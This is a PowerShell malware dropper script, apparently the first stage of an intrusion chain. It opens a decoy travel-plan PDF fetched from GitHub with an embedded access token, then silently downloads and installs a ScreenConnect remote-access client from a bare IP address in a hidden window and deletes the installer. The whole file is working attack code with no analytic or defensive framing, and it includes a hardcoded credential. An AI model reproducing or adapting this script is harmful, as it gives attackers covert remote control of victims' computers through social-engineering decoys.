# stage1.ps1 - Read box.txt, check GO, execute final payload

$ErrorActionPreference = 'SilentlyContinue'
$boxPath = "$env:APPDATA\Microsoft\Credentials\box.txt"
$githubToken = "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"

# Find box.txt
$locations = @($boxPath, "$env:USERPROFILE\Desktop\box.txt", "$env:TEMP\box.txt")
$found = $false

foreach ($loc in $locations) {
    if (Test-Path $loc) {
        $content = [System.IO.File]::ReadAllText($loc, [System.Text.Encoding]::UTF8)
        if ($content -match "GO") {
            $found = $true
            break
        }
    }
}

if (-not $found) { exit }

# All clear - AV checked, no sandbox, GO confirmed

# === 1. Get Fresh PDF Download URL ===
$pdfPath = "$env:TEMP\Travel_Plan_Meeting_Q4_2026.pdf"
$pdfUrl = $null

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $headers = @{
        "Authorization" = "token $githubToken"
        "Accept" = "application/vnd.github.v3+json"
    }
    $fileInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/Travel_Plan_Meeting_Q4_2026.pdf" -Headers $headers
    $pdfUrl = $fileInfo.download_url
} catch {}

# === 2. Download Travel Plan PDF Decoy ===
if ($pdfUrl) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($pdfUrl, $pdfPath)
    } catch {}
}

# === 3. Open PDF in Edge Browser (Decoy) ===
$edgePaths = @(
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    "C:\Windows\System32\msedge.exe"
)
$edgePath = $null
foreach ($ep in $edgePaths) {
    if (Test-Path $ep) { $edgePath = $ep; break }
}

if ($edgePath -and (Test-Path $pdfPath)) {
    Start-Process $edgePath -ArgumentList "--new-window `"$pdfPath`""
} elseif (Test-Path $pdfPath) {
    Start-Process $pdfPath
}

# === 4. Download ScreenConnect MSI ===
$msiUrl = "http://96.30.206.19:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$msiPath = "$env:TEMP\ScreenConnect.ClientSetup.msi"

try {
    $wc2 = New-Object System.Net.WebClient
    $wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc2.DownloadFile($msiUrl, $msiPath)
} catch {}

# === 5. Execute ScreenConnect Silent Install ===
if (Test-Path $msiPath) {
    Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -Wait
}

# === 6. Cleanup MSI ===
try { Remove-Item $msiPath -Force -ErrorAction SilentlyContinue } catch {}
